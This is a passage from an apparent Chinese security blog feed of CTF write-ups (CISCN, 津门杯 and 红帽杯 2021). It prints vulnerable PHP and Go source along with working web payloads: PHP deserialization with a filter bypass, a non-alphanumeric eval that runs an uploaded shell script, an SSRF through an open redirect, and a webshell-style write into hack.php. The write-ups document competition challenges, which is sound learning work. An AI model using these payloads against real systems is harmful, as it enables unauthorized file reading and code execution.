class="line">TP_DCS-popis:Uncompressed Text</span><br><span class="line">No class</span><br><span class="line">Alphabet:Default</span><br><span class="line"></span><br><span class="line">the first part of the flag is the first 8 digits of your phone number</span><br><span class="line">Length:69</span><br><span class="line"></span><br><span class="line">SMSC#</span><br><span class="line">Receipient:+8615030442000</span><br><span class="line">Validity:Rel 5d </span><br><span class="line">TP_PID:00</span><br><span class="line">TP_DCS:08</span><br><span class="line">TP_DCS-popis:Uncompressed Text</span><br><span class="line">No class</span><br><span class="line">Alphabet:UCS2(16)bit</span><br><span class="line"></span><br><span class="line">那其他部分呢</span><br><span class="line">Length:6</span><br><span class="line"></span><br><span class="line">SMSC#</span><br><span class="line">Receipient:+8615030442000</span><br><span class="line">Validity:Rel 1h </span><br><span class="line">TP_PID:00</span><br><span class="line">TP_DCS:08</span><br><span class="line">TP_DCS-popis:Uncompressed Text</span><br><span class="line">No class</span><br><span class="line">Alphabet:UCS2(16)bit</span><br><span class="line"></span><br><span class="line">看看你能从这些数据里发现什么？w465</span><br><span class="line">Length:16.5</span><br><span class="line"></span><br><span class="line">SMSC#+10086</span><br><span class="line">Sender:+8615030442000</span><br><span class="line">TimeStamp:25&#x2F;04&#x2F;21 19:43:59 GMT ?</span><br><span class="line">TP_PID:00</span><br><span class="line">TP_DCS:00</span><br><span class="line">TP_DCS-popis:Uncompressed Text</span><br><span class="line">No class</span><br><span class="line">Alphabet:Default</span><br><span class="line"></span><br><span class="line">5b4c4ce7b6d5edd6d5cb961fca84f193ca71471db155b62c9df5ea1ebed933929de07bebcdb7853ddaf6303ac6fbaaa0fff6bb23cbfefbecd716028173e1259796fbeebf3f12f43ea54fcfeee54f11c8</span><br><span class="line">Length:160</span><br><span class="line"></span><br><span class="line">SMSC#+10086</span><br><span class="line">Sender:+8615030442000</span><br><span class="line">TimeStamp:25&#x2F;04&#x2F;21 19:44:43 GMT ?</span><br><span class="line">TP_PID:00</span><br><span class="line">TP_DCS:00</span><br><span class="line">TP_DCS-popis:Uncompressed Text</span><br><span class="line">No class</span><br><span class="line">Alphabet:Default</span><br><span class="line"></span><br><span class="line">f5a91d7cb54fd0b83e927bbfbe7d6a121d32649748f453ca0fbffe56162c5e5c4e3f757804e9aeb17a8b441513c78591c43c9493bb2567c6a475e69c59912c9e2f0785fe43761a523efa7c7479effdbf</span><br><span class="line">Length:160</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>将内容处理成如下格式。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TimeStamp:25&#x2F;04&#x2F;2021 19:43:59 GMT ?##5b4c4ce7b6d5edd6d5cb961fca84f193ca71471db155b62c9df5ea1ebed933929de07bebcdb7853ddaf6303ac6fbaaa0fff6bb23cbfefbecd716028173e1259796fbeebf3f12f43ea54fcfeee54f11c8</span><br></pre></td></tr></table></figure><p>使用如下脚本按时间顺序提取出内容，再十六进制解码可得到一张图片。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;r&quot;</span>).read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">dataSet = <span class="built_in">dict</span>()</span><br><span class="line"><span class="keyword">for</span> datum <span class="keyword">in</span> data:</span><br><span class="line">    timeStamp, datum = datum.split(<span class="string">&quot;?##&quot;</span>)</span><br><span class="line">    timeStamp = timeStamp[<span class="number">10</span>:<span class="number">29</span>]</span><br><span class="line">    timeStamp = time.mktime(time.strptime(timeStamp, <span class="string">&quot;%d/%m/%Y %H:%M:%S&quot;</span>))</span><br><span class="line">    <span class="built_in">set</span> = &#123;timeStamp: datum&#125;</span><br><span class="line">    dataSet.update(<span class="built_in">set</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">sorted</span>(dataSet):</span><br><span class="line">    <span class="built_in">print</span>(dataSet[i], end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>根据暗示将图片的宽度修改为 465 可以得到下图。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/ab96538f-1f60-45c7-abf2-b5a32ffe7625/1621264945828/3dc96be32ae123ae82a44be2b9c91e8bd4192053.png"></p><p>根据 SMS 提示可知 flag 前八位 <code>15030442</code>。将其拼合起来可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CISCN&#123;15030442_b586_4c9e_b436_26def12293e4&#125;</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>https://lemonprefect.cn/zh-CN/posts/7c083fa1.html#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>津门杯 2021</title>
      <link>https://lemonprefect.cn/zh-CN/posts/d2e5a5ad.html</link>
      <guid>https://lemonprefect.cn/zh-CN/posts/d2e5a5ad.html</guid>
      <pubDate>Mon, 10 May 2021 16:33:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h2&gt;&lt;h3 id=&quot;power-cut&quot;&gt;&lt;a href=&quot;#power-cut&quot; class=&quot;headerlink&quot; title=&quot;power_cut&quot;&gt;&lt;/a&gt;power_cut&lt;/h3&gt;&lt;p&gt;&lt;code&gt;.index.php.swp&lt;/code&gt; 源码泄露可以得到如下代码。&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span</description>
          
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="power-cut"><a href="#power-cut" class="headerlink" title="power_cut"></a>power_cut</h3><p><code>.index.php.swp</code> 源码泄露可以得到如下代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">logger</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logFile</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$initMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$exitMsg</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// initialise variables</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;initMsg=<span class="string">&quot;#--session started--#\n&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;exitMsg=<span class="string">&quot;#--session end--#\n&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;logFile =  <span class="variable">$file</span>;</span><br><span class="line">        readfile(<span class="keyword">$this</span>-&gt;logFile);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$msg</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$fd</span>=fopen(<span class="keyword">$this</span>-&gt;logFile,<span class="string">&quot;a+&quot;</span>);</span><br><span class="line">        fwrite(<span class="variable">$fd</span>,<span class="variable">$msg</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        fclose(<span class="variable">$fd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;this is destruct&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">weblog</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$weblogfile</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$flag</span>=<span class="string">&quot;system(&#x27;cat /flag&#x27;)&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// self::waf($this-&gt;filepath);</span></span><br><span class="line">        <span class="variable">$obj</span> = <span class="keyword">new</span> logger(<span class="keyword">$this</span>-&gt;weblogfile);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$str</span>=preg_replace(<span class="string">&quot;/[&lt;&gt;*#&#x27;|?\n ]/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span>=str_replace(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;this is destruct&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$log</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;log&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = preg_replace(<span class="string">&quot;/[&lt;&gt;*#&#x27;|?\n ]/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$log</span>);</span><br><span class="line"><span class="variable">$log</span> = str_replace(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$log</span>);</span><br><span class="line"><span class="variable">$log_unser</span> = unserialize(<span class="variable">$log</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;&lt;br/&gt;昨天晚上因为<span class="number">14</span>级大风停电了.&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>可知 flag 位于根目录下，同时 weblog 对象会实例化一个 logger 对象，从而触发到 <code>readfile($this-&gt;logFile)</code> 处，而 <code>logFile</code> 是可控属性，因此可以反序列化触发读取文件。反序列化前采用了 <code>preg_replace()</code> 方法来过滤输入，只需要在序列化后的载荷中双写绕过即可。构造出如下脚本。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">weblog</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$weblogfile</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;weblogfile = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> weblog());</span><br></pre></td></tr></table></figure><p>运行脚本并双写绕过过滤后得到如下载荷。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;weblog&quot;:1:&#123;s:10:&quot;weblogfile&quot;;s:5:&quot;&#x2F;fflaglag&quot;;&#125;</span><br></pre></td></tr></table></figure><p>将载荷为参数 log 的值发送即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;EfuteB3QOqvRqD099mHuDRJKWRxnAC47&#125;</span><br></pre></td></tr></table></figure><h3 id="hate-php"><a href="#hate-php" class="headerlink" title="hate_php"></a>hate_php</h3><p>题目给出的代码如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9_$@]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;fighting!&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在响应中可以找到 <code>X-Powered-By: PHP/5.6.40</code>。因此常见的取反和亦或都在 PHP 5.x 下失去作用。因此尝试执行 PHP 上传临时文件。</p><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p></blockquote><p>使用参考文章中的方法构造出如下载荷。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;?&gt;&lt;?&#x3D;&#96;. &#x2F;???&#x2F;????????[?-[]&#96;;?&gt;</span><br></pre></td></tr></table></figure><p>再使用 POST 传入一个文件，其中写上需要执行的恶意 shell 指令，以文件的形式上传。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">cat /f*</span><br></pre></td></tr></table></figure><p>载荷发送后即可在响应中得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;h76ghpt2v2JiYEKzBQ5ysxu9b2Z3mN4A&#125;</span><br></pre></td></tr></table></figure><h3 id="GoOSS"><a href="#GoOSS" class="headerlink" title="GoOSS"></a>GoOSS</h3><p>靶机给出的访问对的是 Go 的服务，因此有两个接口。在 <code>/vul</code> 下可以找到如下功能。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> !strings.HasPrefix(url.Url,<span class="string">&quot;http://127.0.0.1:1234/&quot;</span>)&#123;</span><br><span class="line">    c.JSON(<span class="number">403</span>, gin.H&#123;<span class="string">&quot;msg&quot;</span>: <span class="string">&quot;url forbidden&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">client := &amp;http.Client&#123;Timeout: <span class="number">2</span> * time.Second&#125;</span><br><span class="line"></span><br><span class="line">resp, err := client.Get(url.Url)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提供的是一个访问本地服务并返回结果的功能，而根据附件可知靶机的 80 端口运行着 Apache 并可以用如下 PHP 代码进行文件读取。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// php in localhost port 80</span></span><br><span class="line">readfile(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>尝试 bypass 这个检测去 SSRF 发现不太可能。找到了如下的代码片段，从而尝试使用 302 跳转来实现一个 SSRF。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> !strings.HasSuffix(c.Request.URL.String(), <span class="string">&quot;/&quot;</span>)&#123;</span><br><span class="line">    c.Redirect(<span class="number">302</span>,c.Request.URL.String()+<span class="string">&quot;/&quot;</span>)</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    files := <span class="built_in">make</span>([]<span class="keyword">string</span>,<span class="number">0</span>)</span><br><span class="line">    l,_ := f.Readdir(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> _,i := <span class="keyword">range</span> l&#123;</span><br><span class="line">        files = <span class="built_in">append</span>(files, i.Name())</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">        <span class="string">&quot;files&quot;</span> :files,</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>open redirect in static handler</p><p><a href="https://github.com/go-macaron/macaron/issues/198">https://github.com/go-macaron/macaron/issues/198</a></p></blockquote><p>按照参考中的利用构造出 <code>&#123;&quot;url&quot;: &quot;http://127.0.0.1:1234//YOUR_HOST_IP/..&quot;&#125;</code>  即可 302 去访问任意的地址。只需要在服务器端放上如下代码即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> header(<span class="string">&quot;Location: http://127.0.0.1/index.php?file=/flag&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;30e308e8e7122579b8ea2fae774d1999&#125;</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>https://lemonprefect.cn/zh-CN/posts/d2e5a5ad.html#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>红帽杯 2021</title>
      <link>https://lemonprefect.cn/zh-CN/posts/938f6c40.html</link>
      <guid>https://lemonprefect.cn/zh-CN/posts/938f6c40.html</guid>
      <pubDate>Sun, 09 May 2021 17:47:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h2&gt;&lt;h3 id=&quot;find-it&quot;&gt;&lt;a href=&quot;#find-it&quot; class=&quot;headerlink&quot; title=&quot;find_it&quot;&gt;&lt;/a&gt;find_it&lt;/h3&gt;&lt;p&gt;&lt;code&gt;robots.txt&lt;/code&gt; 下可以读到如下内容。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;figcaption&gt;&lt;span&gt;text&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td</description>
          
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="find-it"><a href="#find-it" class="headerlink" title="find_it"></a>find_it</h3><p><code>robots.txt</code> 下可以读到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">When I was a child,I also like to read Robots.txt</span><br><span class="line"></span><br><span class="line">Here is what you want:1ndexx.php</span><br></pre></td></tr></table></figure><p><code>/.1ndexx.php.swp</code> 下可以读到如下内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $link &#x3D; mysql_connect(&#39;localhost&#39;, &#39;root&#39;); ?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Hello worldd!&lt;&#x2F;title&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">body &#123;</span><br><span class="line">background-color: white;</span><br><span class="line">text-align: center;</span><br><span class="line">padding: 50px;</span><br><span class="line">font-family: &quot;Open Sans&quot;,&quot;Helvetica Neue&quot;,Helvetica,Arial,sans-serif;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#logo &#123;</span><br><span class="line">margin-bottom: 40px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;img id&#x3D;&quot;logo&quot; src&#x3D;&quot;logo.png&quot; &#x2F;&gt;</span><br><span class="line">&lt;h1&gt;&lt;?php echo &quot;Hello My freind!&quot;; ?&gt;&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;?php if($link) &#123; ?&gt;</span><br><span class="line">&lt;h2&gt;I Can&#39;t view my php files?!&lt;&#x2F;h2&gt;</span><br><span class="line">&lt;?php &#125; else &#123; ?&gt;</span><br><span class="line">&lt;h2&gt;MySQL Server version: &lt;?php echo mysql_get_server_info(); ?&gt;&lt;&#x2F;h2&gt;</span><br><span class="line">&lt;?php &#125; ?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">#Really easy...</span><br><span class="line"></span><br><span class="line">$file&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;) or die(&quot;Unable 2 open!&quot;);</span><br><span class="line"></span><br><span class="line">$I_know_you_wanna_but_i_will_not_give_you_hhh &#x3D; fread($file,filesize(&quot;flag.php&quot;));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$hack&#x3D;fopen(&quot;hack.php&quot;,&quot;w&quot;) or die(&quot;Unable 2 open&quot;);</span><br><span class="line"></span><br><span class="line">$a&#x3D;$_GET[&#39;code&#39;];</span><br><span class="line"></span><br><span class="line">if(preg_match(&#39;&#x2F;system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\&#96;|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump&#x2F;&#39;,$a))&#123;</span><br><span class="line">die(&quot;you die&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(strlen($a)&gt;33)&#123;</span><br><span class="line">die(&quot;nonono.&quot;);</span><br><span class="line">&#125;</span><br><span class="line">fwrite($hack,$a);</span><br><span class="line">fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh);</span><br><span class="line"></span><br><span class="line">fclose($file);</span><br><span class="line">fclose($hack);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>尝试在 hack.php 中写入 phpinfo，使用如下载荷即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span>%<span class="number">20</span>phpinfo();%<span class="number">20</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问 hack.php 可在 phpinfo 中找到 ICQ_FLAG。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;eb06d4ad-87aa-4e6f-b874-dcb33edaefde&#125;</span><br></pre></td></tr></table></figure><h3 id="framework"><a href="#framework" class="headerlink" title="framework"></a>framework</h3><p><code>/www.zip</code> 存在源码泄露，使用 wget 指令添加 <code>-t0</code> 参数来下载（try 123 才下好就离谱）。拿下框架代码后可以发现在 <code>controllers/SiteController.php</code> 下存在一个反序列化点。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionAbout</span>(<span class="params"><span class="variable">$message</span> = <span class="string">&#x27;Hello&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = base64_decode(<span class="variable">$message</span>);</span><br><span class="line">    unserialize(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此只需要找一个反序列化链执行即可。在 <code>vendor/yiisoft/yii2/rest/CreateAction.php</code> 下可以找到 <code>run()</code> 方法下的一个利用点。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;checkAccess)&#123;</span><br><span class="line">        call_user_func(<span class="keyword">$this</span>-&gt;checkAccess, <span class="keyword">$this</span>-&gt;id);</span><br><span class="line">    &#125;</span><br><span class="line">    <span 